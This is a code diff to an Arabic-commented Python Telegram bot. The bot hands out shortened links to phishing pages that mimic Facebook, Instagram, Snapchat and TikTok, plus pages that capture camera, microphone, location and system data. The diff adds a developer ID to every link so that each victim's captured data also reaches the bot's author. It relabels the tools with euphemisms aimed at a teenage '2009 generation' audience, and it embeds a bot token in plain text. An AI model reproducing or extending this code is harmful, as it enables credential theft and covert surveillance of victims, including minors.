@@ -6,14 +6,14 @@ import os
 import logging
 import time
 
-# منع التنبيهات المزعجة
+# إعدادات السيرفر لمنع التوقف
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
 app = Flask('')
 @app.route('/')
 def home():
-    return "M.Y.9 System Online"
+    return "M.Y.9 Dual-Route System Online"
 
 def run():
     port = int(os.environ.get('PORT', 8080))
@@ -23,11 +23,12 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- إعدادات البوت والتوكن ---
+# --- إعدادات البوت ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
+MY_ID = '7238206121' # هاد الآي دي تبعك يا أبو سند عشان يوصلك نسخة من كل شي
 bot = telebot.TeleBot(TOKEN)
 
-# حل مشكلة الـ Conflict 409
+# تنظيف الاتصال وحل مشكلة 409
 bot.remove_webhook()
 time.sleep(1)
 
@@ -44,57 +45,53 @@ def send_welcome(message):
     first_name = message.from_user.first_name
     hunter = first_name.replace(" ", "_")
     
-    # رابط الـ GitHub Pages الأساسي تبعك
+    # رابط الـ GitHub Pages
     base = "https://m-y-9-tech.github.io/fb/" 
+    
+    # قائمة الروابط الـ 8 المجهزة لجيل 2009
+    links = {
+        "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "tik": short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "mic": short_link(f"{base}mic.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
+        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}&dev={MY_ID}")
+    }
 
-    # تجهيز الروابط الـ 8 بشكل منفصل
-    fb_link = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
-    ig_link = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
-    snap_link = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
-    tik_link = short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}")
-    cam_link = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
-    mic_link = short_link(f"{base}mic.html?id={uid}&hunter={hunter}")
-    loc_link = short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
-    sys_link = short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
-
-    # الرسالة بنفس التنسيق اللي طلبته بالضبط
     msg = f"""
-نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
+نـ^ـظـ^ـام M.Y.9 الـمـزدوج | أهلاً بك {first_name}
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
-⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
-عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـقـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.
-
-🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
-https://www.instagram.com/m_y_.9/?hl=ar#
+⚠️ تـنـبـيـه: الـصـيـد يـصـل إلـيـك وإلـى الـمـطـور تـلـقـائـيـاً.
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
+💎 روابـط جـيـل 2009 الـمـفـعـلـة 💎
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb_link}`
+🔹 فيـسـبوك (قرارات) 🔐: `{links['fb']}`
 
-🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig_link}`
+🔹 انـستـقرام (توقعات) 🛡️: `{links['ig']}`
 
-🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap_link}`
+🔹 سـنـاب (المحذوف) 👻: `{links['snap']}`
 
-🔹 اختـ^ـراق تـيـك تـوك 🎵: `{tik_link}`
+🔹 تـيـك تـوك (تسريب) 🎵: `{links['tik']}`
 
-🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{cam_link}`
+🔹 الكـامـيرا (مراقبة) 📸: `{links['cam']}`
 
-🔹 تـسـجـيـل الـصـوت 🎤: `{mic_link}`
+🔹 الـمـايك (تسجيل) 🎤: `{links['mic']}`
 
-🔹 تـحـديـد المـ^ـوقـ^ـع 📍: `{loc_link}`
+🔹 الـمـوقع (القاعات) 📍: `{links['loc']}`
 
-🔹 سـحـب مـعـلـومـات الـنـظـام 📱: `{sys_link}`
+🔹 الـنـظام (ملفات) 📱: `{links['sys']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
+⚙️ Status: Connected
     """
     bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)
 
 if __name__ == "__main__":
     keep_alive()
-    print("🚀 M.Y.9 System Started Successfully!")
     bot.infinity_polling()
